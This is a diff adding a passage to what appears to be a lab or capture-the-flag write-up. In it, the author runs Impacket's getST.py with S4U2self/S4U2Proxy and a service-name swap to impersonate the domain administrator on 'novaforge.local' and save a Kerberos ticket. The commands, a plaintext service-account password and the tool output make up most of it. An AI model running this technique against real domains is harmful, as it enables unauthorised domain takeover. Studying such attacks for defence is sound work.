@@ -1215,3 +1215,21 @@ python3 addspn.py -t 'DC$' --spn "cifs/storage.novaforge.local" -u 'novaforge.lo
 
 Ill then add the SPN to the domain controller
 
+```python
+getST.py -spn "cifs/storage.novaforge.local" -impersonate "administrator" 'novaforge.local/svc_it_admin:Password123!' -altservice "cifs/dc.novaforge.local"
+Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Changing service from cifs/storage.novaforge.local@NOVAFORGE.LOCAL to cifs/dc.novaforge.local@NOVAFORGE.LOCAL
+[*] Saving ticket in administrator@cifs_dc.novaforge.local@NOVAFORGE.LOCAL.ccache
+```
+
+Now i have the ccache file for the domain admin!
+
+```python
+
+```
